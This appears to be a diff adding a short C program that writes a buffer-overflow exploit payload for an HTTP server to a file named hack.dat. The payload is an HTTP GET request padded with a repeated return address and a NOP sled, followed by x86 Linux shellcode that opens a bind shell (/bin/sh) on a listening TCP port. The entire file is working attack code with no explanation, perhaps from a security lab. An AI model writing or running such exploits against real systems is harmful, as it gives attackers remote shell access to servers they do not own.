@@ -1,0 +1,30 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+char addr[] = "\xff\xfe\xff\xbf"; // Reversed, 0xBFFFFEFF
+int numNops = 422;
+char noop[] = "\x90";
+int numAddrs = 80;
+char shellCode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x56\xce\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";
+int main(int argc, char** argv) {
+	long len=0;
+	unsigned int i;
+	FILE* output;
+	output=fopen("hack.dat", "w");
+	fprintf (output, "GET /");
+	for (i = 0; i < numAddrs; i++) {
+		fprintf(output,"%s", addr);
+		len+=strlen(addr);
+	}
+	for (i = 0; i < numNops; i++) {
+		fprintf(output,"%s", noop);
+		len+=strlen(noop);
+	}
+	fprintf (output,"%s", shellCode);
+	len+=strlen(shellCode);
+	fprintf (output," HTTP");
+	fclose (output);
+	printf("%lu\n",len);
+	return 0;
+}
